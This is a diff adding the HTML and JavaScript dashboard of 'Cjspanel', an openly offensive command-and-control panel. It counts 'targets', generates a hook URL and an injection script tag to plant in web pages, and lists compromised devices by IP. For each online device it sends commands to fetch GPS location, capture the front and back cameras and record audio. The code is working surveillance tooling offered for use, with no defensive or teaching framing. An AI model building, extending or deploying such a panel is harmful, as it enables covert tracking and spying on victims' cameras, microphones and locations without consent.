@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Cjspanel V1 - Command Center</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        /* CSS remains identical to original, just ensuring relative paths for locally hosted assets if any */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root { --green: #00ff00; --green-dark: #00cc00; --red: #ff3b3b; --red-dark: #cc0000; --yellow: #ffcc00; --cyan: #00ccff; --bg-dark: #0a0a0a; --bg-card: rgba(0, 20, 0, 0.8); --border: rgba(0, 255, 0, 0.3); }
+        body { font-family: 'Share Tech Mono', monospace; background: var(--bg-dark); min-height: 100vh; color: var(--green); overflow-x: hidden; }
+        body::before { content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1000; background: repeating-linear-gradient(0deg, rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1) 1px, transparent 1px, transparent 2px); }
+        body::after { content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: -1; background-image: linear-gradient(rgba(0, 255, 0, 0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 255, 0, 0.03) 1px, transparent 1px); background-size: 50px 50px; }
+        .sidebar { position: fixed; left: 0; top: 0; width: 280px; height: 100vh; background: var(--bg-card); border-right: 1px solid var(--border); padding: 20px; z-index: 100; overflow-y: auto; }
+        .logo-section { text-align: center; padding: 20px 0; border-bottom: 1px solid var(--border); margin-bottom: 20px; }
+        .logo-icon { font-size: 50px; margin-bottom: 10px; animation: pulse 2s ease-in-out infinite; color: var(--green); }
+        @keyframes pulse { 0%, 100% { transform: scale(1); filter: drop-shadow(0 0 10px var(--green)); } 50% { transform: scale(1.05); filter: drop-shadow(0 0 20px var(--green)); } }
+        .logo-text { font-family: 'Orbitron', sans-serif; font-size: 24px; font-weight: 900; color: var(--green); text-shadow: 0 0 20px var(--green); letter-spacing: 3px; }
+        .version-tag { font-size: 10px; color: var(--red); margin-top: 5px; letter-spacing: 2px; }
+        .nav-menu { list-style: none; }
+        .nav-link { display: flex; align-items: center; padding: 15px; color: var(--green); text-decoration: none; border: 1px solid transparent; border-radius: 5px; transition: all 0.3s ease; font-size: 13px; text-transform: uppercase; letter-spacing: 1px; }
+        .nav-link:hover, .nav-link.active { background: rgba(0, 255, 0, 0.1); border-color: var(--green); box-shadow: 0 0 15px rgba(0, 255, 0, 0.3); }
+        .nav-link.active { color: var(--bg-dark); background: var(--green); }
+        .main-content { margin-left: 280px; padding: 30px; min-height: 100vh; }
+        .header { display: flex; justify-content: space-between; align-items: center; padding-bottom: 20px; border-bottom: 1px solid var(--border); margin-bottom: 30px; }
+        .header-title { font-family: 'Orbitron', sans-serif; font-size: 28px; text-transform: uppercase; letter-spacing: 3px; text-shadow: 0 0 20px var(--green); }
+        .header-info { text-align: right; font-size: 11px; }
+        .header-info .user { color: var(--red); font-size: 14px; margin-bottom: 5px; }
+        .stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin-bottom: 30px; }
+        .stat-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 5px; padding: 25px; position: relative; overflow: hidden; transition: all 0.3s ease; }
+        .stat-card:hover { border-color: var(--green); box-shadow: 0 0 30px rgba(0, 255, 0, 0.2); transform: translateY(-5px); }
+        .stat-card::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 3px; background: linear-gradient(90deg, var(--green), var(--red)); }
+        .stat-icon { font-size: 30px; margin-bottom: 15px; }
+        .stat-value { font-family: 'Orbitron', sans-serif; font-size: 36px; font-weight: 700; margin-bottom: 5px; color: var(--green); text-shadow: 0 0 20px var(--green); }
+        .stat-label { font-size: 11px; text-transform: uppercase; letter-spacing: 2px; color: rgba(0, 255, 0, 0.6); }
+        .btn-generate { background: transparent; border: 2px solid var(--red); color: var(--red); padding: 20px 40px; font-family: 'Orbitron', sans-serif; font-size: 16px; text-transform: uppercase; letter-spacing: 3px; cursor: pointer; transition: all 0.3s ease; position: relative; overflow: hidden; }
+        .btn-generate:hover { background: var(--red); color: var(--bg-dark); box-shadow: 0 0 40px rgba(255, 59, 59, 0.5); }
+        #hookResults { display: none; background: var(--bg-card); border: 1px solid var(--green); border-radius: 5px; padding: 25px; margin-top: 20px; animation: slideIn 0.5s ease; }
+        .hook-item { margin-bottom: 15px; }
+        .hook-item label { display: block; font-size: 11px; color: var(--red); text-transform: uppercase; margin-bottom: 8px; }
+        .hook-item input, .hook-item textarea { width: 100%; background: rgba(0,0,0,0.5); border: 1px solid var(--border); color: var(--green); padding: 12px; font-family: 'Share Tech Mono', monospace; font-size: 12px; }
+        .section-title { font-family: 'Orbitron', sans-serif; font-size: 18px; text-transform: uppercase; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; }
+        .section-title .count { background: var(--green); color: var(--bg-dark); padding: 5px 15px; border-radius: 20px; font-size: 12px; }
+        .devices-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 20px; margin-bottom: 40px; }
+        .device-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 5px; padding: 20px; transition: all 0.3s ease; }
+        .device-card:hover { border-color: var(--green); box-shadow: 0 0 20px rgba(0, 255, 0, 0.2); }
+        .device-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
+        .device-status { display: flex; align-items: center; gap: 8px; font-size: 11px; }
+        .status-dot { width: 10px; height: 10px; border-radius: 50%; }
+        .status-dot.online { background: var(--green); box-shadow: 0 0 10px var(--green); animation: blink 1s infinite; }
+        .status-dot.offline { background: var(--red); }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        .command-panel { display: none; margin-top: 15px; padding-top: 15px; border-top: 1px solid var(--border); }
+        .device-card:hover .command-panel { display: block; }
+        .cmd-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; }
+        .cmd-btn { background: transparent; border: 1px solid var(--green); color: var(--green); padding: 10px; font-size: 10px; cursor: pointer; transition: all 0.2s ease; display: flex; flex-direction: column; align-items: center; gap: 5px; }
+        .cmd-btn:hover { background: var(--green); color: var(--bg-dark); }
+        .cmd-btn-danger { border-color: var(--red); color: var(--red); }
+        .cmd-btn-danger:hover { background: var(--red); color: white; }
+        .console-section { background: var(--bg-card); border: 1px solid var(--border); border-radius: 5px; margin-top: 30px; }
+        .console-header { display: flex; align-items: center; padding: 15px 20px; border-bottom: 1px solid var(--border); }
+        .console-body { padding: 20px; height: 200px; overflow-y: auto; font-size: 12px; line-height: 1.8; }
+        .log-time { color: #666; }
+        .log-success { color: var(--green); }
+        .log-info { color: var(--cyan); }
+        .log-warning { color: var(--yellow); }
+    </style>
+</head>
+<body>
+    <div class="sidebar">
+        <div class="logo-section">
+            <div class="logo-icon"><i class="fa-solid fa-skull"></i></div>
+            <div class="logo-text">CJSPANEL</div>
+            <div class="version-tag">[ v1.0 // CLASSIFIED ]</div>
+        </div>
+        <ul class="nav-menu">
+            <li class="nav-item"><a href="dashboard.html" class="nav-link active"><i class="fa-solid fa-satellite-dish"></i> Command Center</a></li>
+            <li class="nav-item"><a href="gallery.html" class="nav-link"><i class="fa-solid fa-database"></i> Data Vault</a></li>
+            <li class="nav-item"><a href="settings.html" class="nav-link"><i class="fa-solid fa-gear"></i> System Config</a></li>
+            <li class="nav-item"><a href="#" id="logout-btn" class="nav-link danger"><i class="fa-solid fa-power-off"></i> Terminate Session</a></li>
+        </ul>
+    </div>
+
+    <div class="main-content">
+        <div class="header">
+            <h1 class="header-title">Command Center</h1>
+            <div class="header-info">
+                <div class="user" id="welcome-user"><i class="fa-solid fa-user-secret"></i> Welcome, Operator</div>
+                <div class="time" id="currentTime"></div>
+            </div>
+        </div>
+
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-icon icon-glow-green"><i class="fa-solid fa-crosshairs"></i></div>
+                <div id="stat-total" class="stat-value">0</div>
+                <div class="stat-label">Total Targets</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon icon-glow-green"><i class="fa-solid fa-circle-nodes"></i></div>
+                <div id="stat-online" class="stat-value">0</div>
+                <div class="stat-label">Active Connections</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon icon-glow-red"><i class="fa-solid fa-plug-circle-xmark"></i></div>
+                <div id="stat-offline" class="stat-value">0</div>
+                <div class="stat-label">Inactive</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon icon-glow-green"><i class="fa-solid fa-chart-pie"></i></div>
+                <div id="stat-rate" class="stat-value">0%</div>
+                <div class="stat-label">Success Rate</div>
+            </div>
+        </div>
+
+        <div class="action-section">
+            <button class="btn-generate" id="generate-btn"><i class="fa-solid fa-bolt"></i> Generate Payload</button>
+            <div id="hookResults">
+                <div class="hook-title"><i class="fa-solid fa-circle-check"></i> Payload Generated Successfully</div>
+                <div class="hook-item"><label>Demo URL</label><input type="text" id="demoUrl" readonly></div>
+                <div class="hook-item"><label>Hook URL</label><input type="text" id="hookUrl" readonly></div>
+                <div class="hook-item"><label>Injection Script</label><textarea id="scriptTag" readonly></textarea></div>
+            </div>
+        </div>
+
+        <div class="section-title"><span><i class="fa-solid fa-signal"></i> Active Targets</span><span class="count" id="online-count">0</span></div>
+        <div class="devices-grid" id="online-devices"></div>
+
+        <div class="section-title offline"><span><i class="fa-solid fa-circle-xmark"></i> Inactive Targets</span><span class="count" id="offline-count">0</span></div>
+        <div class="devices-grid" id="offline-devices"></div>
+
+        <div class="console-section">
+            <div class="console-header"><div class="console-dots"><span></span><span></span><span></span></div><div class="console-title"><i class="fa-solid fa-terminal"></i> System Console</div></div>
+            <div class="console-body" id="consoleLog"></div>
+        </div>
+    </div>
+
+    <script type="module">
+        import CONFIG from './js/config.js';
+
+        // Add log entry
+        function addLog(type, message) {
+            const console = document.getElementById('consoleLog');
+            const time = new Date().toLocaleTimeString();
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            entry.innerHTML = `<span class="log-time">[${time}]</span> <span class="log-${type}">${message}</span>`;
+            console.appendChild(entry);
+            console.scrollTop = console.scrollHeight;
+        }
+
+        async function fetchStats() {
+            try {
+                const res = await fetch(`${CONFIG.API_BASE_URL}/api/stats`);
+                if (res.status === 401) window.location.href = 'login.html';
+                const data = await res.json();
+                document.getElementById('stat-total').textContent = data.total;
+                document.getElementById('stat-online').textContent = data.online;
+                document.getElementById('stat-offline').textContent = data.offline;
+                document.getElementById('stat-rate').textContent = (data.total > 0 ? Math.round((data.online / data.total) * 100) : 0) + '%';
+            } catch (err) { addLog('error', 'Failed to fetch stats'); }
+        }
+
+        async function fetchDevices() {
+            try {
+                const res = await fetch(`${CONFIG.API_BASE_URL}/api/devices`);
+                const data = await res.json();
+                renderDevices(data.devices);
+            } catch (err) { addLog('error', 'Failed to load devices'); }
+        }
+
+        function renderDevices(devices) {
+            const onlineContainer = document.getElementById('online-devices');
+            const offlineContainer = document.getElementById('offline-devices');
+            onlineContainer.innerHTML = '';
+            offlineContainer.innerHTML = '';
+            
+            let onlineCount = 0;
+            let offlineCount = 0;
+
+            devices.forEach(device => {
+                const card = document.createElement('div');
+                card.className = `device-card ${!device.is_active ? 'offline' : ''}`;
+                const content = `
+                    <div class="device-header">
+                        <div class="device-id"><i class="fa-solid fa-desktop"></i> ${device.id.substring(0, 12)}...</div>
+                        <div class="device-status">
+                            <span class="status-dot ${device.is_active ? 'online' : 'offline'}"></span>
+                            ${device.is_active ? 'CONNECTED' : 'DISCONNECTED'}
+                        </div>
+                    </div>
+                    <div class="device-info">
+                        <strong>IP:</strong> ${device.ip}<br>
+                        <strong>Last Seen:</strong> ${new Date(device.last_seen).toLocaleString()}
+                    </div>
+                    ${device.is_active ? `
+                    <div class="command-panel">
+                        <div class="cmd-grid">
+                            <button class="cmd-btn" data-id="${device.id}" data-cmd="get_location"><i class="fa-solid fa-location-dot"></i> GPS</button>
+                            <button class="cmd-btn" data-id="${device.id}" data-cmd="front_camera"><i class="fa-solid fa-camera"></i> Front</button>
+                            <button class="cmd-btn" data-id="${device.id}" data-cmd="back_camera"><i class="fa-solid fa-camera-retro"></i> Back</button>
+                            <button class="cmd-btn" data-id="${device.id}" data-cmd="record_audio"><i class="fa-solid fa-microphone"></i> Audio</button>
+                            <button class="cmd-btn cmd-btn-danger delete-btn" data-id="${device.id}"><i class="fa-solid fa-trash"></i> Delete</button>
+                        </div>
+                    </div>` : `
+                    <div class="command-panel">
+                        <button class="cmd-btn cmd-btn-danger delete-btn" style="width:100%" data-id="${device.id}"><i class="fa-solid fa-trash"></i> Delete Device</button>
+                    </div>`}
+                `;
+                card.innerHTML = content;
+                
+                if (device.is_active) {
+                    onlineContainer.appendChild(card);
+                    onlineCount++;
+                } else {
+                    offlineContainer.appendChild(card);
+                    offlineCount++;
+                }
+            });
+
+            document.getElementById('online-count').textContent = onlineCount;
+            document.getElementById('offline-count').textContent = offlineCount;
+
+            // Attach listeners
+            document.querySelectorAll('.cmd-btn').forEach(btn => {
+                btn.onclick = (e) => {
+                    e.stopPropagation();
+                    const id = btn.getAttribute('data-id');
+                    const cmd = btn.getAttribute('data-cmd');
+                    if (cmd) sendCommand(id, cmd);
+                };
+            });
+            document.querySelectorAll('.delete-btn').forEach(btn => {
+                btn.onclick = (e) => {
+                    e.stopPropagation();
+                    deleteDevice(btn.getAttribute('data-id'));
+                };
+            });
+        }
+
+        async function sendCommand(deviceId, command) {
+            addLog('warning', `Sending ${command} to ${deviceId.substring(0, 8)}...`);
+            try {
+                await fetch(`${CONFIG.API_BASE_URL}/api/execute_command`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ device_id: deviceId, command })
+                });
+                addLog('success', `Command ${command} sent`);
+            } catch (err) { addLog('error', 'Command delivery failed'); }
+        }
+
+        async function deleteDevice(deviceId) {
+            if (!confirm('Permanently delete this device?')) return;
+            try {
+                await fetch(`${CONFIG.API_BASE_URL}/api/delete_device/${deviceId}`, { method: 'POST' });
+                addLog('success', 'Device purged from system');
+                fetchDevices();
+                fetchStats();
+            } catch (err) { addLog('error', 'Purge failed'); }
+        }
+
+        document.getElementById('generate-btn').onclick = async () => {
+            addLog('info', 'Generating payload...');
+            const res = await fetch(`${CONFIG.API_BASE_URL}/generate_hook`);
+            const data = await res.json();
+            document.getElementById('demoUrl').value = data.demo_url;
+            document.getElementById('hookUrl').value = data.hook_url;
+            document.getElementById('scriptTag').value = data.script_tag;
+            document.getElementById('hookResults').style.display = 'block';
+            addLog('success', 'Terminal payload ready');
+        };
+
+        document.getElementById('logout-btn').onclick = async () => {
+            await fetch(`${CONFIG.API_BASE_URL}/api/logout`, { method: 'POST' });
+            window.location.href = 'login.html';
+        };
+
+        // Init
+        fetchStats();
+        fetchDevices();
+        setInterval(() => { fetchStats(); fetchDevices(); }, 5000);
+        addLog('success', 'Command Center Online');
+    </script>
+</body>
+</html>
